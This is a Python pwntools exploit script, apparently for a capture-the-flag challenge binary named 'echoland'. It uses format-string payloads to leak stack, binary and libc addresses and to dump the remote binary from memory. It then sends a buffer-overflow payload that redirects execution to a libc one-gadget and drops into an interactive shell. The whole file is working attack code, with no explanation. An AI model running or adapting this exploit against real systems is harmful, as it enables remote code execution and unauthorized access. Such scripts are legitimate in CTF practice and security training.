from pwn import *
from pwnlib.util.packing import p64
from pwnlib.util.misc import align
from pathlib import Path

IS_LOCAL = False
IS_DEBUG = True
ENABLE_ASLR = False

INPUT_FILENAME = "echoland"

REMOTE_HOST = ""
REMOTE_PORT = 31880

context.terminal = ['tmux', 'new-window']

LOCAL_IMAGE_BASE = 0x00555555400000

if IS_LOCAL:
    if IS_DEBUG:
        io = process(INPUT_FILENAME, aslr=ENABLE_ASLR)
        pid, io_gdb = gdb.attach(io, api=True, gdbscript="""
            break *0x5555555552ed
            break *0x5555555552A7
            continue
        """)

    else:
        io = process(INPUT_FILENAME)
else:
    io = remote(REMOTE_HOST, REMOTE_PORT)

def leak_addresses(num: int) -> list:
    log.info('Leaking data...')

    res = []
    for i in range(1, num, 1):
        io.recvuntil(b'> ')
        fmt = b'%' + str(i).encode() + b'$p'
        io.sendline(fmt)

        rcvd = io.recvline().strip()
        if rcvd == b'(nil)':
            rcvd = b'0x0'

        #print(f'{i}: {rcvd}')
        addr = int(rcvd, 16)
        res.append(addr)

    return res

def search_elf(start_address: int, step: int = 0x1000) -> int:
    # > %9$p1111111111111111
    # 0x3131313131313131111111111111111
    log.info('Searching for \'ELF\' magic bytes...')

    start = start_address
    while True:
        io.recvuntil(b'> ')

        fmt = b'%9$s||||' + p64(start)
        io.sendline(fmt)

        rcvd = io.recvline()
        if rcvd.startswith(b'\x7fELF'):
            return start

        start -= step

def leak_address_at_pos(pos: int) -> int:
    log.info(f'Trying to get address at positon {hex(pos)}...')
    io.recvuntil(b'> ')

    fmt = b'%' + str(pos).encode() + b'$p'
    io.sendline(fmt)

    rcvd = io.recvline().strip()
    if rcvd == b'(nil)':
        rcvd = b'0x0'

    return int(rcvd, 16)

def get_image_base() -> int:
    BINARY_ADDR_POS = 0xc
    leak_binary = leak_address_at_pos(BINARY_ADDR_POS) & 0xfffffffffffff000
    log.success(f'Leaked and aligned binary address: {hex(leak_binary)}')

    base_offset = 0x1000
    if not base_offset:
        elf_offset = search_elf(leak_binary)
        base_offset = leak_binary - elf_offset
        log.success(f'Leak and base Δ: {hex(base_offset)}')

    image_base = leak_binary - base_offset
    return image_base

def download_binary(image_base: int) -> bytes:
    global io

    MAX_ATTEMPTS = 5
    num_errors = 0

    log.info('Downloading binary...')

    binary = bytes()
    offset = image_base
    while True:
        io.recvuntil(b'> ')

        fmt = b'%9$s||||' + p64(offset)
        try:
            io.sendline(fmt)
            rcvd = io.recvuntil(b'||||', timeout=1).rstrip(b'||||')
            num_errors = 0

        except Exception as e:
            log.info(f'Disconnected ({repr(e)}). Bytes downloaded: {hex(len(binary))}')

            num_errors += 1
            if num_errors >= MAX_ATTEMPTS:
                break

            io.close()

            io = remote(REMOTE_HOST, REMOTE_PORT)

            image_base = get_image_base()
            log.success(f'Found new image base: {hex(image_base)}')

            new_binary_sz = align(8, len(binary))
            if new_binary_sz != len(binary):
                binary = binary.ljust(new_binary_sz, b'\0')
            else:
                binary = binary.ljust(len(binary)+8, b'\0')

            log.info(f'Trying offset {len(binary)}...')

            offset = image_base + len(binary)
            continue

        if not rcvd:
            rcvd = b'\0'

        binary += rcvd
        offset += len(rcvd)

    return binary

def exploit(image_base: int, offset: int) -> None:
    log.info('Trying to take control over RIP...')

    io.recvuntil(b'> ')
    io.sendline(b'1')
    io.recvuntil(b'>> ')

    TARGET_OFFSET = image_base + offset

    p_ret_addr = cyclic_find(b'saaa')
    payload = flat(
        {
            p_ret_addr : TARGET_OFFSET
        },
        word_size = 64,
        filler = b'\0',
        length = 0x96
    )
    io.sendline(payload)

def get_libc_base() -> int:
    BINARY_ADDR_POS = 0xd
    leak_binary = leak_address_at_pos(BINARY_ADDR_POS) & 0xfffffffffffff000
    log.success(f'Leaked and aligned LIBC address: {hex(leak_binary)}')

    base_offset = 0x21000
    if not base_offset:
        elf_offset = search_elf(leak_binary)
        base_offset = leak_binary - elf_offset
        log.success(f'Leak and LIBC base Δ: {hex(base_offset)}')

    image_base = leak_binary - base_offset
    return image_base

image_base = get_image_base()
log.success(f'Found image base: {hex(image_base)}')

libc_base = get_libc_base()
log.success(f'Found LIBC base: {hex(libc_base)}')

binary_file = Path(INPUT_FILENAME)
if not binary_file.is_file():
    binary = download_binary(image_base)
    log.success(f'Download completed ({hex(len(binary))} bytes)')

    with open(INPUT_FILENAME, 'wb') as f:
        f.write(binary)
        log.success(f'Saved as \'{INPUT_FILENAME}\'')

# ONE_GADGET = 0x4f3d5
ONE_GADGET = 0x4f432
# ONE_GADGET = 0x10a41c

exploit(libc_base, ONE_GADGET)

log.success('Spawning shell...')
io.interactive()
